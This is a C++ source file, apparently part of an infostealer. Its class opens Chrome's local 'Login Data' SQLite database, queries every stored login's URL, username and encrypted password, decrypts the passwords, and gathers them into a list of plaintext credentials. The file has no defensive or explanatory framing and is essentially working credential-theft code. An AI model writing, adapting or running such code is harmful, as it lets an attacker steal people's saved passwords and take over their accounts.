
#include <memory>
#include "../includes/sqlite3.h"
#include "../includes/Base64.h"
#include "../includes/cJSON.h"
#include "../includes/ChromePasswordCollecter.h"

List<userData> ChromePasswordCollecter::collectData()
{
	for (const auto& browser : m_chromeList)
	{
		collectFromPath(browser);
	}

	return m_collectedData;
}
void ChromePasswordCollecter::collectFromPath(const String& chromePath)
{

	if (!getDbPath(chromePath)) return;

	sqlite3* db;

	if (sqlite3_open(m_chromeSqlitePath.c_str(), &db) != SQLITE_OK)
		return;


	sqlite3_stmt* stmt;
	if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, 0) != SQLITE_OK)
		return;

	if (!m_decryptor.initDecryptor(chromePath))
		 return;

	//go over the db and fill the inforamtion by row
	while (sqlite3_step(stmt) == SQLITE_ROW)
	{
		userData userData;

		char* url = (char*)sqlite3_column_text(stmt, 0);
		char* username = (char*)sqlite3_column_text(stmt, 1);
		char* password = (char*)sqlite3_column_text(stmt, 2);

		if (url == nullptr && username == nullptr && password == nullptr)
			break;
		if ((strlen(url) == 0) && (strlen(username) == 0) && (strlen(password) == 0))
			continue;

		if(url)
			userData.url = url;
		if (username)
			userData.username = username;
		String decPassword;
		
		if (m_decryptor.decrypt(password, decPassword, sqlite3_column_bytes(stmt, 2)))
			userData.password = decPassword;
			
		m_collectedData.emplace_back(userData);
	}

}


bool ChromePasswordCollecter::getDbPath(const String& chromePath)
{
	const int localData = 0x001c;
	std::string path = m_decryptor.getAppFolder(localData);
	if (path.empty())
		return false;
	m_chromeSqlitePath = path;
	m_chromeSqlitePath += chromePath + R"(\User Data\Default\Login Data)";
	return true;
	
}
